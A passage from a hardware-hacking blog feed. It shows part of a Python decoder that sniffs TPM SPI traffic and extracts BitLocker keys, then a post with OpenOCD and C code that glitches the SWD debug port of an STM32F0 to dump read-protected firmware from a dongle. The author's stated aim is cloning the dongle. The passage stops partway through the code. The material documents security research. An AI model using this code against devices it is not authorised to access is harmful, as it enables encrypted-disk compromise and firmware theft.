        <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="p">[</span><span class="n">key</span><span class="p">))</span>

    <span class="n">opIsRead</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">numBytes</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">transactionStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">transactionEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">putdata</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">OPERATION_MASK</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span>    <span class="c1"># 1 = read, 0 = write
</span>            <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">mosi</span> <span class="o">&amp;</span> <span class="n">SIZE_MASK</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c1"># Minimum transfer = 1 byte
</span>            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span>
            <span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span> <span class="o">=</span> <span class="n">ss</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_ARG</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">mosi</span>
            <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addrIdx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># Wait state
</span>                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">WAITING</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">miso</span> <span class="o">&amp;</span> <span class="n">WAIT_MASK</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Wait finished
</span>                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span>
        <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">TRANSFER</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># Read from device
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">miso</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>   <span class="c1"># Read from controller
</span>                <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">mosi</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">==</span> <span class="n">self</span><span class="p">.</span><span class="n">numBytes</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span> <span class="o">=</span> <span class="n">es</span>
                <span class="c1">#print("Transaction: ", self.bytesRead)
</span>                <span class="n">self</span><span class="p">.</span><span class="nf">report_transaction</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span> <span class="ow">and</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">TPM_DATA_FIFO_0</span><span class="sh">"</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">transactionStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">transactionEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">bytesRead</span><span class="p">)</span>
                <span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">opIsRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>

                <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>

    <span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># 0 = Write, 1 = Read
</span>    <span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">fifoStart</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">fifoEnd</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">endfifo</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="c1"># No FIFO
</span>        <span class="n">self</span><span class="p">.</span><span class="nf">report_fifo</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">"</span><span class="s">{:02X}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Bitlocker Key: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">def</span> <span class="nf">putfifo</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">!=</span> <span class="n">ttype</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="n">ttype</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span> <span class="o">=</span> <span class="n">start</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span> <span class="o">=</span> <span class="n">end</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[The TPM 2.0, also known as Trusted Platform Module 2.0, is a hardware security feature embedded in many modern computers. Its purpose is to provide a secure way to store cryptographic keys and other sensitive data, such as passwords and digital certificates, aiming to protect against various security threats, including unauthorized access to a computer’s hardware and software. TPM 2.0 represents an evolution of the original TPM specification, developed by the Trusted Computing Group (TCG), and features additional capabilities and resources, such as support for additional cryptographic algorithms and the ability to store larger amounts of data.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">STM32F0x Protected Firmware Dumper</title><link href="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper" rel="alternate" type="text/html" title="STM32F0x Protected Firmware Dumper" /><published>2024-01-16T05:23:00+00:00</published><updated>2024-01-16T05:23:00+00:00</updated><id>https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper</id><content type="html" xml:base="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper"><![CDATA[<p>In the process of my hobby hardware hacking, I encountered a Chinese clone of a HASP HL dongle equipped with a STM32F042G6U6 processor. My intention was to clone it, and during my exploration, I discovered four pins from the SWD debug interface located at the bottom of the PCB. I soldered a 4-pin header to these pins for ease of access.</p>

<p>Utilizing my Segger J-Link as a debug probe, although any JTAG adapter should suffice, I paired it with OpenOCD. Given that the chipset is recognized by OpenOCD, I crafted a script to extract all possible data, conditional upon enablement.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adapter driver jlink
transport select swd
adapter_khz 4000
source [find target/stm32f0x.cfg]
init
dap info
reset halt
flash read_bank 0 firmwareF1.bin 0 0x8000
reset
shutdown
</code></pre></div></div>

<p>But, hit a snag - the device’s RDP (Read-Out Protection) was on, even though SWD was active. No biggie, I thought, and tried to bypass this with voltage fault injection. However, the internal clock generator in the device made clock glitching a no-go. After a few hours of getting nowhere, it was clear I needed a new game plan.</p>

<p>My search for alternatives led me to a comprehensive paper detailing three methodologies to extract protected memory:</p>

<p><a href="https://www.aisec.fraunhofer.de/en/FirmwareProtection.html">https://www.aisec.fraunhofer.de/en/FirmwareProtection.html</a></p>

<p>I gave the Cold Boot Method a shot, but no dice - probably because I couldn’t tinker with the device’s clock, and that’s pretty much a deal-breaker for it to work. The UVC method? Too risky, and I wasn’t about to wreck the dongle. So, that left me with SWD Debug Port glitching.</p>

<p>Now, there was a PoC for this glitch, and it had some good info, but it was all about STM32 code with a bunch of device-specific stuff. I needed something more universal. After combing through the PoC and the paper, I mixed in some of my own sauce and crafted a new code.</p>

<p>For the testing ground, I hooked up a Raspberry Pi Pico with <a href="http://platform.io/">platform.io</a>. I had to go direct with the SWD protocol since standard debug probes like my J-Link were too nosy with device initialization. This glitch needed a quick draw on the flash read, and every millisecond counted.</p>

<p>Here’s the kicker - the code’s protection only kicks in when you try to touch the flash memory with debug mode on. But if you’re quick on the draw, you can snag a DWORD from the flash before the doors slam shut.</p>

<p>To pull the whole firmware, it’s a dance with the reset pin and the device’s power supply. You’ve got to power cycle to reset the debug mode flag. Here’s the play-by-play:</p>

<ol>
  <li>Hit the reset pin</li>
  <li>Juice up the device</li>
  <li>Release the reset pin</li>
  <li>Make the read</li>
  <li>Cut the power</li>
  <li>Run it back</li>
</ol>

<p>The Raspberry Pi Pico was all I needed to power the device since the STM32 doesn’t pull much juice. If you’re dealing with something thirstier, a transistor or relay to flip the power might be the way to go. You can check out the whole operation and the code over at <a href="https://github.com/racerxdl/stm32f0-pico-dump">https://github.com/racerxdl/stm32f0-pico-dump</a> or available below.</p>

<p><img src="/assets/posts/patreon/Pasted image 20230124035820.png" alt="Working dump of bytes" />
<em>An image showcasing streams of DWORD data from the STM32F0 firmware being transmitted in real-time via the Raspberry Pi Pico’s serial port, illuminating the terminal with lines of extracted code.</em></p>

<h2 id="code">Code</h2>

<h3 id="halc">hal.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">targetInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">targetPowerOff</span><span class="p">();</span>
    <span class="n">targetReset</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetRestore</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="readerc">reader.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cm">/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */</span>
<span class="n">swdStatus_t</span> <span class="nf">extractFlashData</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">dbgStatus</span><span class="p">;</span>

    <span class="cm">/* Add some jitter on the moment of attack (may increase attack effectiveness) */</span>
    <span class="k">static</span> <span class="kt">uint16_t</span> <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">extractedData</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">idCode</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* Limit the maximum number of attempts PER WORD */</span>
    <span class="kt">uint32_t</span> <span class="n">numReadAttempts</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* try up to MAX_READ_TRIES times until we have the data */</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

        <span class="n">targetPowerOn</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>

        <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">idCode</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdEnableDebugIF</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSetAP32BitMode</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSelectAHBAP</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">targetRestore</span><span class="p">();</span>
            <span class="n">delay</span><span class="p">(</span><span class="n">delayJitter</span><span class="p">);</span>

            <span class="cm">/* The magic happens here! */</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdReadAHBAddr</span><span class="p">((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFCu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">extractedData</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">targetReset</span><span class="p">();</span>

        <span class="cm">/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">extractedData</span><span class="p">;</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="o">++</span><span class="n">numReadAttempts</span><span class="p">;</span>

            <span class="n">delayJitter</span> <span class="o">+=</span> <span class="n">DELAY_JITTER_MS_INCREMENT</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">delayJitter</span> <span class="o">&gt;=</span> <span class="n">DELAY_JITTER_MS_MAX</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">targetPowerOff</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">targetRestore</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">targetReset</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">dbgStatus</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">numReadAttempts</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">MAX_READ_ATTEMPTS</span><span class="p">)));</span>

    <span class="k">return</span> <span class="n">dbgStatus</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="swdc">swd.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="cp">#define MWAIT __asm__ __volatile__( \
    ".syntax unified 		\n"          \
    "	movs r0, #0x20 		\n"          \
    "1: 	subs r0, #1 		\n"          \
    "	bne 1b 			\n"                 \
    ".syntax divided"               \
    :                               \
    :                               \
    : "cc", "r0")
</span>
<span class="cp">#define N_READ_TURN (3u)
</span>
<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">par</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">par</span> <span class="o">^=</span> <span class="p">(</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">par</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

